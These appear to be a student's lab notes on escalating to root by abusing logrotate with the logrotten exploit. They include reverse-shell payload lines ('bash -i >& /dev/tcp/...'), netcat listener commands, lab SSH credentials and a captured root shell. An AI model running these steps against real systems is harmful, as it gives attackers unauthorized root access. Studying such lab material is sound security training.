# Logrotate

Logrotate has many features for managing these log files. These include the specification of:

the size of the log file,
its age,
and the action to be taken when one of these factors is reached.

cat /etc/logrotate.conf

Force a new rotation :

sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3

Find the corresponding configuration files in /etc/logrotate.d/ directory :

ls /etc/logrotate.d/
alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp

cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}

## Exploitation

Requirements :

- we need write permissions on the log files
- logrotate must run as a privileged user or root
- vulnerable versions:
3.8.6
3.11.0
3.15.0
3.18.0

git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create

On our attack host :s
nc -nlvp 9001

./logrotten -p ./payload /tmp/tmp.log

## LAB

ssh htb-student@10.129.204.41
HTB_@cademy_stdnt!



git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
scp logrotten htb-student@10.129.204.41:/home/htb-student/
HTB_@cademy_stdnt!

### Recon

htb-student@ubuntu:~$ tree .
.
├── backups
│   ├── access.log
│   └── access.log.1
└── logrotten
    ├── README.md
    ├── logrotten.c
    ├── logrotten.png
    └── test
        ├── create_env.sh
        ├── logrotate.cfg
        └── pwnme.log

ls -l backups/

ls -l backups/
total 4
-rw-r--r-- 1 htb-student htb-student  0 Jun 14  2023 access.log
-rw-r--r-- 1 htb-student htb-student 91 Jun 14  2023 access.log.1



grep "create\|compress" /etc/logrotate.conf | grep -v "#"
grep: /etc/logrotate.conf: No such file or directory

cat /var/lib/logrotate.status
logrotate state -- version 2
"/home/htb-student/backups/access.log" 2023-6-14-14:1:27

logrotate -vf /home/htb-student/backups/access.log
Ignoring /home/htb-student/backups/access.log because it's empty.

logrotate -vf /home/htb-student/backups/access.log.1

sudo logrotate -vf /home/htb-student/backups/access.log.1

chmod 777 /var/lib/logrotate.status
chmod: changing permissions of '/var/lib/logrotate.status': Operation not permitted

ls /etc/logrotate.d/
alternatives  apt      dpkg  rsyslog                 ufw
apport        bootlog  mon   ubuntu-advantage-tools  unattended-upgrades

cat /etc/logrotate.d/dpkg
/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}

### Exploit

cd logrotten
gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/10.10.14.179/9001 0>&1' > payload

On our attack host :s
nc -nlvp 9001

./logrotten -p ./payload /home/htb-student/backups/access.log
Waiting for rotating /home/htb-student/backups/access.log...

echo 11 > /home/htb-student/backups/access.log

Renamed /home/htb-student/backups with /home/htb-student/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!

nc -nlvp 9001

root@ubuntu:~# cat /root/flag.txt
HTB{l0G_r0t7t73N_00ps}
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cat
ls

